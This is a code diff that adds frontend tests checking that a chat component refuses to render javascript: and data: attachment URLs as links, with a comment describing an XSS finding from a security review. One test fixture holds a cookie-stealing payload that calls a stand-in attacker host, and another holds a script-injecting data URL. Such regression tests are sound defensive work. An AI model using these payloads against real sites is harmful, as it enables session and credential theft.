@@ -1,5 +1,37 @@
 import { describe, it, expect } from 'vitest';
-import { describeStructuredUpload } from './FileAttach.jsx';
+import { render, screen } from '@testing-library/react';
+import { LangProvider } from '../services/langContext.jsx';
+import { describeStructuredUpload, FileMessageContent } from './FileAttach.jsx';
+
+// AQ security review finding: an emergency-chat message from ANOTHER
+// participant (not just the local user) containing a crafted
+// "[📎 EKLİ DOSYA: ...]\njavascript:..." body used to render as a clickable
+// styled attachment link -- clicking it ran attacker JS in the viewer's own
+// authenticated origin (cookie/JWT-reachable XSS).
+describe('FileMessageContent attachment URL safety', () => {
+  it('refuses to render a javascript: URL as a link -- falls back to plain text', () => {
+    const text = 'bak bu dosyaya\n\n[📎 EKLİ DOSYA: rapor.png]\njavascript:fetch(\'https://evil.example/steal?c=\'+document.cookie)';
+    render(<LangProvider><FileMessageContent text={text} /></LangProvider>);
+    expect(screen.queryByRole('link')).not.toBeInTheDocument();
+    expect(document.body.textContent).toContain('javascript:fetch');
+  });
+
+  it('still renders a real same-origin relative attachment URL as a link', () => {
+    render(<LangProvider><FileMessageContent text={'not\n\n[📎 EKLİ DOSYA: rapor.pdf]\n/api/files/abc-123.pdf'} /></LangProvider>);
+    expect(screen.getByRole('link')).toHaveAttribute('href', '/api/files/abc-123.pdf');
+  });
+
+  it('still renders a real https:// attachment URL as a link', () => {
+    render(<LangProvider><FileMessageContent text={'not\n\n[📎 EKLİ DOSYA: rapor.pdf]\nhttps://cdn.example.com/rapor.pdf'} /></LangProvider>);
+    expect(screen.getByRole('link')).toHaveAttribute('href', 'https://cdn.example.com/rapor.pdf');
+  });
+
+  it('refuses a data: URL too', () => {
+    const text = 'x\n\n[📎 EKLİ DOSYA: a.png]\ndata:text/html,<script>alert(1)</script>';
+    render(<LangProvider><FileMessageContent text={text} /></LangProvider>);
+    expect(screen.queryByRole('link')).not.toBeInTheDocument();
+  });
+});
 
 describe('describeStructuredUpload', () => {
   it('returns an empty string for no file', () => {
